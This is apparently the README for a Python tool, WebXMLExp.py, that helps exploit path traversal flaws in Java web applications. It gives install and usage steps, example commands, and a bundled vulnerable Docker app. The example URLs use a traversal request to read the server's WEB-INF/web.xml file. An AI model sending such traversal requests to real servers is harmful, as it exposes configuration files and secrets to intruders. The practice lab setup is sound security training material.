### WebXMLExp.py

Tool for helping in the exploitation of path traversal vulnerabilities in Java web applications.

## Install

Run the following command:
```
pip install -r requirements.txt
```
## Usage:

After installation provide an exploit URL like so:
```
usage: python WebXMLExp.py <url_with_web_xml_exploit_or_inject_here_marker>
```

### Examples

```
python WebXMLExp.py "http://127.0.0.1:8082/vulnerable/download.servlet?filename=WEB-INF/web.xml"
python WebXMLExp.py "http://127.0.0.1:8082/vulnerable/download.servlet?filename=<INJECT-HERE>"
```

## Vulnerable web application docker image

A web application vulnerable to a path traversal vulnerability is provided in the **docker** folder.

To start, enter into the **docker** folder and run:

```
docker-compose up
```

The application is accessible at  **http://127.0.0.1:8082/vulnerable/**.

To exploit the the path traversal vulnerability visit:
http://127.0.0.1:8082/vulnerable/download.servlet?filename=WEB-INF/web.xml
